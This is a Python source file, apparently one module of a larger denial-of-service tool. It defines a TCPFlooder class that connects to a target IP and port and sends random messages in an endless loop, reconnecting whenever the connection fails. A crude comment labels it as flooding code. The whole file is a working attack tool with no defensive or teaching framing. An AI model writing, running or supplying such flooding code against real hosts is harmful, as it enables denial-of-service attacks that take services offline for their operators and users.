import socket
import sys
from role import flooder


class TCPFlooder(flooder.Flooder):
	def __init__(self, ip, port):
		flooder.Flooder.__init__(self, ip, port)
		self.socket_type = 1
		self.socket_protocol = 6
		self.socket_options = [
			{
				"level": 0,
				"option": 10,
				"value": 20
			}
		]

	def run(self):
		# Instantiate the socket
		s = socket.socket(socket.AF_INET, self.socket_type, self.socket_protocol)

		# Set the socket options
		# if sys.platform == 'linux' or sys.platform == 'linux2':
		# 	for option in self.socket_options:
		# 		s.setsockopt(option.get('level'), option.get('option'), option.get('value'))
		s.settimeout(None)

		# Attempt to establish a connection
		try:
			s.connect((self.ip, int(self.port)))
		except socket.error:
			print("Socket error")
			sys.exit()

		# Flood that bitch
		try:
			while True:
				try:
					s.sendto(self.get_random_message(), (self.ip, int(self.port)))
				except socket.error:
					try:
						s.close()
						s = socket.socket(socket.AF_INET, self.socket_type)
						s.connect((self.ip, int(self.port)))
					except socket.error:
						print('Reconnecting...')
		except KeyboardInterrupt:
			sys.exit()
